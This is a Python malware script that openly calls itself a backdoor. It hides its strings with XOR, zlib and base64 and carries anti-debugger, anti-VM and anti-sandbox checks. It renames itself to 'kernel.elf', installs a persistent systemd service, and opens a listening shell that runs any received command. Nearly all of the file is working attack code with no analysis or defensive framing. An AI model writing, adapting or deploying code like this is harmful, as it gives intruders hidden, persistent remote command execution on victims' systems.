import os
import sys
import socket
import subprocess
import time
import base64
import zlib
import random
import string
import multiprocessing

# Function to generate random encryption key dynamically
def generate_random_key(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

# Advanced obfuscation using XOR + zlib + base64
def advanced_obfuscate_string(s, key):
    compressed = zlib.compress(s.encode())
    xor_encrypted = bytes([b ^ ord(k) for b, k in zip(compressed, key * len(compressed))])
    return base64.b64encode(xor_encrypted).decode()

def advanced_decrypt_string(enc_string, key):
    decoded = base64.b64decode(enc_string)
    xor_decrypted = bytes([b ^ ord(k) for b, k in zip(decoded, key * len(decoded))])
    return zlib.decompress(xor_decrypted).decode()

# Randomized encryption key to avoid static analysis
key = generate_random_key()

# Randomized port selection (within a safe range)
port = random.randint(40000, 45000)

# Obfuscate sensitive strings
obfuscated_host = advanced_obfuscate_string('0.0.0.0', key)
obfuscated_quit = advanced_obfuscate_string('quit', key)

# Decrypt the obfuscated strings
host = advanced_decrypt_string(obfuscated_host, key)

# Anti-debugging technique: detect debugger using tracerpid
def is_debugger_present():
    try:
        with open("/proc/self/status") as f:
            status = f.read()
            if "TracerPid:\t0" not in status:
                print("Debugger detected, exiting...")
                return True
    except Exception as e:
        return False
    return False

# Anti-VM technique: check for virtualization environments
def is_vm():
    vm_indicators = ['vbox', 'vmware', 'xen', 'qemu']
    try:
        output = subprocess.check_output("dmesg | grep -i virtual", shell=True).decode().lower()
        for indicator in vm_indicators:
            if indicator in output:
                print("Virtualization environment detected, exiting...")
                return True
    except Exception as e:
        return False
    return False

# Anti-Sandbox detection
def is_sandbox():
    if multiprocessing.cpu_count() < 2 or int(os.popen('grep MemTotal /proc/meminfo').read().split()[1]) < 2097152:
        print("Sandbox environment detected, exiting...")
        return True
    return False

# Terminate if debugging or VM environment is detected
# if is_debugger_present() or is_vm() or is_sandbox():
#     sys.exit()

# Function to create or update a systemd service file automatically
def create_systemd_service(new_script_path):
    service_content = f"""
    [Unit]
    Description=Malware Backdoor Service
    After=network.target

    [Service]
    ExecStart=/usr/bin/python3 {new_script_path}
    Restart=always
    User={os.getlogin()}
    WorkingDirectory={os.path.dirname(new_script_path)}

    [Install]
    WantedBy=multi-user.target
    """

    service_file = "/etc/systemd/system/malware-backdoor.service"

    try:
        # Write the service file
        with open(service_file, "w") as f:
            f.write(service_content)

        # Set proper permissions for the service file
        os.system(f'chmod 644 {service_file}')

        # Reload systemd, enable, and start the service
        os.system('systemctl daemon-reload')
        os.system('systemctl enable malware-backdoor.service')
        os.system('systemctl start malware-backdoor.service')

        print("Systemd service created and started successfully!")

    except PermissionError as e:
        print(f"Failed to create systemd service: {e}")
        sys.exit()

# Rename the script to kernel.elf and update the systemd service file
script_path = os.path.abspath(__file__)
new_script_path = os.path.join(os.path.dirname(script_path), "kernel.elf")

# Rename the script to kernel.elf
os.system(f'mv "{script_path}" "{new_script_path}"')
print(f"Script renamed to {new_script_path}")

# Create and update the systemd service to point to kernel.elf
create_systemd_service(new_script_path)

# Create a socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(1)
print(f"Backdoor created and listening on {host}:{port}")

# Modify timestamps for anti-forensics
# for file in os.listdir():
#     os.utime(file, (time.time(), time.time()))

# Define and obfuscate handle_connection function
handle_connection_code = f"""
def hc_x1x2(cs_x1x2):
    while True:
        command = cs_x1x2.recv(1024).decode()

        # Compare the command to the obfuscated 'quit' command
        if command.lower() == advanced_decrypt_string('{obfuscated_quit}', key):
            cs_x1x2.close()
            break

        # Execute the command and send back the result
        output = subprocess.run(command, shell=True, capture_output=True)
        cs_x1x2.send(output.stdout)
"""

# Obfuscate the handle_connection function
obfuscated_handle_connection = base64.b64encode(zlib.compress(handle_connection_code.encode())).decode()

# Dictionary for namespace of dynamically decoded function
exec_namespace = {
    'advanced_decrypt_string': advanced_decrypt_string,
    'key': key,
    'subprocess': subprocess
}

# Decode and execute the obfuscated function, populating the namespace
exec(zlib.decompress(base64.b64decode(obfuscated_handle_connection)).decode(), exec_namespace)

# Main loop to accept and handle incoming connections
while True:
    cs_x1x2, addr = s.accept()
    print(f"Connection from {addr}")
    
    # Call dynamically defined function from the namespace
    exec_namespace['hc_x1x2'](cs_x1x2)

# Close the socket (never reached in normal operation)
s.close()
